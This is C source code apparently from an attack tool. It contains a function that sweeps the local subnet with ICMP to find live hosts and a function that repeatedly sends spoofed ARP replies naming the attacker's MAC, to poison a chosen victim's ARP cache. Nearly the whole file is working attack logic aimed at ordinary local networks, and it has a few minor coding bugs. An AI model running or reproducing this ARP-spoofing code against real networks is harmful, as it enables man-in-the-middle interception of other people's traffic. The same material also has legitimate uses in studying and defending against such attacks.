#include "core.h"

Context CONTEXT;

void* start_local_ip_discovery(void* local_ip_discovery_args) {
    CONTEXT.n_local_addrs_hl = 0;
    LocalIPDiscoveryArgs* args = (LocalIPDiscoveryArgs*)
        local_ip_discovery_args;
    u32 netmask_hl = get_netmask_hl(args->if_name);
    u32 netaddr_hl = get_netaddr_hl(args->if_name);
    int chunk_len = args->requests_chunk_len;

    int timeout_sec = 1;
    int* addr_ids = malloc(chunk_len * sizeof(int));
    int n_addrs = get_n_addr_in_net(netmask_hl);

    printf("INFO: Starting local IPs discovery\n    Netmask: ");
    print_addr_l(netmask_hl);
    printf("\n    Netaddr: ");
    print_addr_l(netaddr_hl);
    printf("\n");

    for (int i = 0; i < n_addrs; ++i) {
        int in_chunk_idx = i % chunk_len;
        addr_ids[in_chunk_idx] = i;
        if (in_chunk_idx != chunk_len - 1 && i != n_addrs - 1) {
            continue;
        }

        int icmp_sock = get_icmp_socket();
        for (int i = 0; i <= in_chunk_idx; ++i) {
            int idx = addr_ids[i];
            u32 addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, idx);
            send_icmp_request(icmp_sock, idx, addr_hl, 0);
        }

        while (1) {
            icmp rep = {0};
            u8 buffer[128] = {};
            int res = receive_socket_reply(
                icmp_sock, buffer, sizeof(buffer), timeout_sec
            );
            if (res != 1) {
                break;
            }

            iphdr* ip_header = (iphdr*)buffer;
            icmp body = {0};
            memcpy(&body, buffer + (ip_header->ihl * 4), sizeof(icmp));
            if (body.icmp_type != ICMP_ECHOREPLY) {
                fprintf(
                    stderr,
                    "WARNING: receive_icmp_reply, the reply is received, "
                    "but its "
                    "type is not equal to ICMP_ECHOREPLY\n"
                );
            } else {
                uint16_t idx = ntohs(body.icmp_hun.ih_idseq.icd_seq);
                u32 addr_hl = get_addr_hl_in_net(
                    netaddr_hl, netmask_hl, idx
                );
                CONTEXT.local_addrs_hl[CONTEXT.n_local_addrs_hl++]
                    = addr_hl;
            }
        }

        memset(addr_ids, 0, sizeof(addr_ids));
        close(icmp_sock);

        printf(
            "    Progress: %d/%d (%d alive)",
            i + 1,
            n_addrs,
            CONTEXT.n_local_addrs_hl
        );
        if (i != n_addrs - 1) {
            printf("\r");
        } else {
            printf("\n");
        }
        fflush(stdout);
    }

    printf(
        "INFO: Local network scanned, we found %d ips: [",
        CONTEXT.n_local_addrs_hl
    );
    for (int i = 0; i < CONTEXT.n_local_addrs_hl; ++i) {
        print_addr_l(CONTEXT.local_addrs_hl[i]);
        if (i != CONTEXT.n_local_addrs_hl - 1) {
            printf(", ");
        }
    }
    printf("]\n");
}

void* start_arp_spoof(void* arp_spoof_args) {
    int arp_sock = get_arp_socket();
    ARPSpoofArgs* args = (ARPSpoofArgs*)arp_spoof_args;
    Mac attacker_mac = get_interface_mac(args->if_name);
    u32 gateway_addr_hl = get_gateway_addr_hl(args->if_name);
    u32 victim_addr_hl = inet_addr(args->victim_addr_str);

    Mac gateway_mac = {0};
    if (request_target_mac(
            arp_sock, args->if_name, &gateway_mac, gateway_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain gateway mac\n");
        close(arp_sock);
        exit(1);
    }

    Mac victim_mac = {0};
    if (request_target_mac(
            arp_sock, args->if_name, &victim_mac, victim_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain victim mac\n");
        close(arp_sock);
        exit(1);
    }

    printf("INFO: ARP spoof started on victim:\n    MAC: ");
    print_mac(victim_mac);
    printf("\n    IP:  ");
    print_addr_l(victim_addr_hl);
    printf("\n");

    args->is_terminated = 0;
    time_t start_time = 0;
    int elapsed_time;
    do {
        time_t current_time = time(NULL);
        elapsed_time = current_time - start_time;
        if (elapsed_time >= args->spoof_period_sec) {
            send_arp_spoof(
                arp_sock,
                args->if_name,
                attacker_mac,
                gateway_addr_hl,
                victim_mac,
                victim_addr_hl
            );
            start_time = time(NULL);
        }
    } while (args->is_terminated == 0);

    close(arp_sock);
    return NULL;
}
